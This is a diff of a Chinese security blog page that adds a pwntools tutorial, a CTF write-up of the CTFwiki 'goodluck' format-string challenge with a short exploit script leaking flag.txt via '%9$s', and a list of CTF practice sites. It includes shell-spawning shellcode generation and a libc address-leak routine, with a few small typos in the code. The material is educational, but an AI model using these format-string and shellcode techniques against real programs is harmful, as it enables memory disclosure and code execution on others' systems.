@@ -78,6 +78,145 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-pwntools常用函数" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/04/27/pwntools%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/" class="article-date">
+  <time class="dt-published" datetime="2021-04-27T12:28:20.000Z" itemprop="datePublished">2021-04-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/04/27/pwntools%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">Pwntools使用介绍</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="具体内容可以参考pwntools官方文档（Google关键词搜索）"><a href="#具体内容可以参考pwntools官方文档（Google关键词搜索）" class="headerlink" title="具体内容可以参考pwntools官方文档（Google关键词搜索）"></a>具体内容可以参考pwntools官方文档（Google关键词搜索）</h3><h2 id="一、环境变量设置"><a href="#一、环境变量设置" class="headerlink" title="一、环境变量设置"></a>一、环境变量设置</h2><p>pwntools的许多设置都是通过全局变量context进行控制的，例如系统、架构、字节序等都可以通过如下的方法更改：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">context.clear()</span><br><span class="line"><span class="comment">#清空context</span></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#设置架构类型</span></span><br><span class="line">context.os==<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#设置os类型</span></span><br></pre></td></tr></table></figure>
+<h2 id="二、连接及信息传输类API"><a href="#二、连接及信息传输类API" class="headerlink" title="二、连接及信息传输类API"></a>二、连接及信息传输类API</h2><p>要进行漏洞利用，首先就要与程序进行通信，pwntools提供的函数能够与本地或远程进行通信。<br>本地程序通过process函数运行，远程通过remote函数进行连接，示例如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sh=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,4444)</span><br></pre></td></tr></table></figure>
+<p>通过process函数运行了当前路径下的二进制pwn程序，通过remote函数与127.0.0.1:4444建立连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#发送信息</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#发送一行信息（自动添加换行符）</span></span><br><span class="line">data=p.recv(count)</span><br><span class="line"><span class="comment">#接受count长度信息</span></span><br><span class="line">data=p.recvuntil(string,drop=True or False)</span><br><span class="line"><span class="comment">#返回直到接收到用户指定的字符串的信息</span></span><br><span class="line">sh.clear()</span><br><span class="line"><span class="comment">#清空消息缓存</span></span><br></pre></td></tr></table></figure>
+<h2 id="三、编码类API"><a href="#三、编码类API" class="headerlink" title="三、编码类API"></a>三、编码类API</h2><p>在漏洞利用的过程中，需要将输入的payload转化为8位、16位、32位或64位、大端或小端所对应的格式。<br>pwntools提供了一组函数用来对给定的数据按照一定的格式进行解码和编码。<br>如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; p32(0x08040000)</span><br><span class="line"><span class="string">&#x27;\x00\x00\x04\x08&#x27;</span></span><br><span class="line">&gt;&gt;&gt;hex(u32(<span class="string">&#x27;\x00\x00\x04\x08&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x08040000&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>pwntools还提供了asm和disasm两个函数进行汇编和反汇编的转换。</p>
+<h2 id="四、文件信息获取类API"><a href="#四、文件信息获取类API" class="headerlink" title="四、文件信息获取类API"></a>四、文件信息获取类API</h2><p>在漏洞利用脚本的编写过程中，经常需要使用got表地址、plt表地址或system函数在libc中的偏移，pwntools能够快速的帮助你找到相应的地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#加载二进制文件</span></span><br><span class="line">elf.got[<span class="string">&#x27;fun_name&#x27;</span>]</span><br><span class="line"><span class="comment">#获取对应函数的got表地址</span></span><br><span class="line">elf.plt[<span class="string">&#x27;fun_name&#x27;</span>]</span><br><span class="line"><span class="comment">#获取对应函数的plt表地址</span></span><br><span class="line">libc=ELF（<span class="string">&#x27;./libc.so.6&#x27;</span>）</span><br><span class="line"><span class="comment">#加载libc函数库</span></span><br><span class="line">libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#获取函数地址</span></span><br></pre></td></tr></table></figure>
+<h2 id="五、libc地址计算类API"><a href="#五、libc地址计算类API" class="headerlink" title="五、libc地址计算类API"></a>五、libc地址计算类API</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#声明一个只包含一个地址参数的函数</span></span><br><span class="line"><span class="comment">#并且这个函数能够泄露至少位于这个地址的一个字节的数据</span></span><br><span class="line">def leak(address):</span><br><span class="line">	data=sh.read(address,4)</span><br><span class="line">	log.debug(<span class="string">&#x27;%#x=&gt;%s&#x27;</span>%(address,(data or <span class="string">&#x27;).encode(&#x27;</span>hex<span class="string">&#x27;)))</span></span><br><span class="line"><span class="string">	return data</span></span><br><span class="line"><span class="string">d=DynELF(leak,elf=elf)</span></span><br><span class="line"><span class="string">system_addr=d.lookup(&#x27;</span>system<span class="string">&#x27;,&#x27;</span>libc<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+<h2 id="六、格式化字符串类API"><a href="#六、格式化字符串类API" class="headerlink" title="六、格式化字符串类API"></a>六、格式化字符串类API</h2><p>在格式化字符串利用中，攻击者往往需要通过漏洞实现任意内存地址写，但构造合适的payload往往需要占用大量的时间。<br>pwntools中的fmtstr模块中实现了和格式化字符串漏洞利用相关的多个函数，极大地加速了漏洞利用脚本的开发速度。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;fmt_payload(5,&#123;0x8041337:0xdeadbeef&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">7\x13\x04\x089\x13\x04\x08%48871c%5<span class="variable">$hn</span>%8126c%6<span class="variable">$hn</span></span><br></pre></td></tr></table></figure>
+<p>如上代码，通过fmtstr模块中的fmtstr_payload函数，生成一段payload实现修改0x8041337地址内容为0xdeadbeef。</p>
+<h2 id="七、调试类API"><a href="#七、调试类API" class="headerlink" title="七、调试类API"></a>七、调试类API</h2><p>如在进行漏洞利用的过程中，调试几乎是必不可少的一个环节，需要通过调试来查看漏洞利用脚本是否达到了预期摸底或者得到一些关键的信息。<br>pwntools提供了用于在程序运行中调用gdb的函数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用gdb.attach(target,gdbscript=None,exe=None,arch=None)函数来启动gdb调试。</span><br><span class="line"><span class="comment">#target为所要调试的进程</span></span><br><span class="line">gdbscript为gdb脚本字符串，在启动gdb时，会先执行该脚本</span><br><span class="line">exe为所调试进程的二进制文件路径</span><br><span class="line">arch为架构。一般情况下，只需要使用前两个参数即可。</span><br></pre></td></tr></table></figure>
+<h2 id="八、其他漏洞利用类API"><a href="#八、其他漏洞利用类API" class="headerlink" title="八、其他漏洞利用类API"></a>八、其他漏洞利用类API</h2><p>用户可以使用shellcraft.arch.os生成相应架构、系统的shellcode。<br>例如64位linux的shellcraft.amd64.linux,以下为官方文档的示例，通过shellcraft.amd64.linux.sh()可以生成一段Linux64位系统下执行shell的汇编代码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;p=run_assembly(shellcraft.amd64.linux.sh())</span><br><span class="line">&gt;&gt;&gt;p=sendline(<span class="string">&#x27;echo Hello&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;p.recv()</span><br><span class="line"><span class="string">&#x27;Hello\n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/27/pwntools%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/" data-id="cko01gjq00000k4u6alhge9mg" data-title="Pwntools使用介绍" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-格式化字符串之CTFwiki-goodluck" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/" class="article-date">
+  <time class="dt-published" datetime="2021-04-24T06:58:00.000Z" itemprop="datePublished">2021-04-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/">格式化字符串之CTFwiki-Goodluck</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="献上goodluck的伪代码"><a href="#献上goodluck的伪代码" class="headerlink" title="献上goodluck的伪代码"></a>献上goodluck的伪代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [rsp+3h] [rbp-3Dh]</span><br><span class="line">  signed int i; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  signed int j; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  char *format; // [rsp+8h] [rbp-38h]</span><br><span class="line">  _IO_FILE *fp; // [rsp+10h] [rbp-30h]</span><br><span class="line">  char *v9; // [rsp+18h] [rbp-28h]</span><br><span class="line">  char v10[24]; // [rsp+20h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v11; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(0x28u);</span><br><span class="line">  fp = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt;= 21; ++i )</span><br><span class="line">    v10[i] = _IO_getc(fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  v9 = v10;</span><br><span class="line">  puts(<span class="string">&quot;what&#x27;s the flag&quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  format = 0LL;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ms&quot;</span>, &amp;format);</span><br><span class="line">  <span class="keyword">for</span> ( j = 0; j &lt;= 21; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = format[j];</span><br><span class="line">    <span class="keyword">if</span> ( !v4 || v10[j] != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;You answered:&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(format);</span><br><span class="line">      puts(<span class="string">&quot;\nBut that was totally wrong lol get rekt&quot;</span>);</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">      <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;That&#x27;s right, the flag is %s\n&quot;</span>, v9);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞点printf-format"><a href="#漏洞点printf-format" class="headerlink" title="漏洞点printf(format);"></a>漏洞点printf(format);</h4><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>我们先在本地创建一个flag.txt文件，以保证程序正常运行<br><img src="/2021/04/24/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/1.png" alt="1.png"><br>结合伪代码和 ./goodluck 我们发现：<br>程序用 IO_getc 把 flag.txt 读入栈中，然后让我们输入字符串，最后输出字符串。</p>
+<h2 id="献上脚本"><a href="#献上脚本" class="headerlink" title="献上脚本"></a>献上脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">goodluck = ELF(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%9<span class="variable">$s</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="comment">##gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>将断点断在printf(fmtstr)上，先后输入<br> r 和 step。发现printf栈帧周围存在已经入栈的flag.txt的内容。<br>发现偏移为4。<br>但是此程序为64位，加上6个寄存器，偏移为10<br>但是%9$s是不包括fmtstr本身的偏移，所以最终偏移为9<br>最后写出脚本，泄露flag.txt.</p>
+<h4 id="有关flag-txt入栈的细节可以自行研究"><a href="#有关flag-txt入栈的细节可以自行研究" class="headerlink" title="有关flag.txt入栈的细节可以自行研究"></a>有关flag.txt入栈的细节可以自行研究</h4>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8BCTFwiki-goodluck/" data-id="cknvemjlo0000kcu6b6voccln" data-title="格式化字符串之CTFwiki-Goodluck" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-pwn学习谷歌关键词" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/04/19/pwn%E5%AD%A6%E4%B9%A0%E8%B0%B7%E6%AD%8C%E5%85%B3%E9%94%AE%E8%AF%8D/" class="article-date">
+  <time class="dt-published" datetime="2021-04-19T13:44:22.574Z" itemprop="datePublished">2021-04-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/04/19/pwn%E5%AD%A6%E4%B9%A0%E8%B0%B7%E6%AD%8C%E5%85%B3%E9%94%AE%E8%AF%8D/">Pwn学习谷歌关键词</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="XCTF攻防世界"><a href="#XCTF攻防世界" class="headerlink" title="XCTF攻防世界"></a>XCTF攻防世界</h3><h3 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h3><h3 id="BMZCTF"><a href="#BMZCTF" class="headerlink" title="BMZCTF"></a>BMZCTF</h3><h3 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h3><h3 id="CTFwiki"><a href="#CTFwiki" class="headerlink" title="CTFwiki"></a>CTFwiki</h3><h3 id="pwntools官方文档"><a href="#pwntools官方文档" class="headerlink" title="pwntools官方文档"></a>pwntools官方文档</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/19/pwn%E5%AD%A6%E4%B9%A0%E8%B0%B7%E6%AD%8C%E5%85%B3%E9%94%AE%E8%AF%8D/" data-id="cknq0526u00000wu69vo5fri6" data-title="Pwn学习谷歌关键词" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-那些你不知道的gdb调试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/04/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84gdb%E8%B0%83%E8%AF%95/" class="article-date">
@@ -241,7 +380,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">七月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li></ul>
     </div>
   </div>
 
@@ -254,23 +393,23 @@
       <ul>
         
           <li>
+            <a href="/2021/07/01/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%975%E2%80%94%E2%80%94linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6/">Pwn入门系列5——linux延迟绑定机制</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%974%E2%80%94%E2%80%94ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/">pwn入门系列4——ELF文件格式</a>
+          </li>
+        
+          <li>
             <a href="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/">Pwn入门系列——函数调用流程与调用约定</a>
           </li>
         
           <li>
-            <a href="/2021/06/29/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E9%83%A8%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E6%A0%BC%E5%BC%8F/">Pwn入门系列——计算机内部数据存储格式</a>
+            <a href="/2021/06/30/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%973%E2%80%94%E2%80%94%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E4%B8%8E%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/">Pwn入门系列3——函数调用流程与调用约定</a>
           </li>
         
           <li>
-            <a href="/2021/06/28/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">Pwn入门系列——汇编语言基础</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/27/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/">漏洞挖掘技术</a>
-          </li>
-        
-          <li>
-            <a href="/2021/06/26/linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">Linux缓冲区溢出</a>
+            <a href="/2021/06/29/pwn%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%972%E2%80%94%E2%80%94%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E9%83%A8%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E6%A0%BC%E5%BC%8F/">Pwn入门系列2——计算机内部数据存储格式</a>
           </li>
         
       </ul>
